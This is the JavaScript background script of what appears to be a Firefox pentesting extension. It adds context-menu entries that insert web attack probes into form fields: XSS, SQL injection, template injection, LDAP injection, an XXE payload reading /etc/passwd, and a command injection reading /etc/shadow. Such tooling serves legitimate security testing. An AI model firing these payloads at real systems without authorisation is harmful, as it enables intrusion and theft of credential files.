let elem = 0

browser.menus.create({
  id: "xss-var",
  title: "XSS + variable name",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.create({
  id: "xss",
  title: "Simple XSS",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.create({
  id: "simple-sqli",
  title: "Simple quote SQLi",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.create({
  id: "double-sqli",
  title: "Double quote SQLi",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.create({
  id: "template-injection",
  title: "Template Injection",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.create({
  id: "xxe-read-file",
  title: "XXE read file",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.create({
  id: "ldap",
  title: "LDAP injection",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.create({
  id: "command",
  title: "Command injection",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});


browser.menus.onClicked.addListener((info, tab) => {
  switch (info.menuItemId) {
    case "xss-var":
      browser.tabs.executeScript(tab.id, {
        frameId: info.frameId,
        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
        elem.value="<img src=1 onerror=alert(\'" + elem.id + "\')>"`,
      });
      break;
    case "xss":
      browser.tabs.executeScript(tab.id, {
        frameId: info.frameId,
        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
        elem.value="<img src=1 onerror=alert()>"`,
      });
      break;
    case "simple-sqli":
      browser.tabs.executeScript(tab.id, {
        frameId: info.frameId,
        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
        elem.value="' or 1=1;-- "`,
      });
      break;
    case "double-sqli":
      browser.tabs.executeScript(tab.id, {
        frameId: info.frameId,
        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
        elem.value='" or 1=1;-- '`,
      });
      break;
    case "template-injection":
      browser.tabs.executeScript(tab.id, {
        frameId: info.frameId,
        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
        elem.value='\${7*7}'`,
      });
      break;
    case "xxe-read-file":
      browser.tabs.executeScript(tab.id, {
        frameId: info.frameId,
        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
        elem.value='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY read SYSTEM "file:///etc/passwd">]><root>&read;</root>'`,
      });
      break;
    case "ldap":
      browser.tabs.executeScript(tab.id, {
        frameId: info.frameId,
        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
        elem.value="*()|&'"`,
      });
      break;
    case "command":
      browser.tabs.executeScript(tab.id, {
        frameId: info.frameId,
        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
        elem.value="; cat /etc/shadow"`,
      });
      break;
  }
});